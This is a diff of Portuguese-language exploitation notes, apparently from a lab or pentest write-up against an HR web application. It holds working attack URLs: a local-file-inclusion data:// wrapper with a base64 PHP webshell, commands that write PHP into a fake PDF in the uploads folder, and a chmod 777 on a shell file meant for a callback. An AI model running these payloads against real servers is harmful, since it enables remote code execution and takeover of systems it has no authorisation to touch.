@@ -41,8 +41,27 @@
 - Descobri onde se encontra o banco de Dados da aplicação agora é so mandar um arquivo .pdf malicioso pra lá e executar
 
 link : http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls%20-la%20/var/www/html/uploads
+<p align="center">  
+  <img width="472" height="150" alt="image" src="https://github.com/user-attachments/assets/9476b697-f51f-469b-86ef-0e02fc1fcd08" />
+</p>
 
-<img width="472" height="150" alt="image" src="https://github.com/user-attachments/assets/9476b697-f51f-469b-86ef-0e02fc1fcd08" />
 - esse arquivo Proposta de Atividade.pdf foi eu que enviei testando a pagina de upload
-- Provando que aqui se instala o banco de dados da pagina de
+- Provando que aqui se instala o banco de dados da pagina
 
+comando que envia pdf malicioso pro site 
+```
+  http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20%27%25PDF-1.4%0A%25%E2%E3%CF%D3%0A%0A%3C?  php%20echo%20%22TESTE%20FUNCIONOU%22%3B%20%3F%3E%27%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2Fteste.pdf
+
+```
+- testando se relamente funcionou : http://rh.businesscorp.com.br/uploads/teste.pdf
+<img width="477" height="83" alt="image" src="https://github.com/user-attachments/assets/16a55f59-ce69-440a-b049-861819f3f9fe" />
+
+---
+
+- agora é so mandar o arquivo executa-lo pra me dar a resposta la onde eu to ouvindo:
+
+- dando permissão de executção pro arquivo : http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/uploads/shell.pdf
+
+
+
+- aqui voce pode criar arquivos dar permissao e apaga-los uma falha gravissima
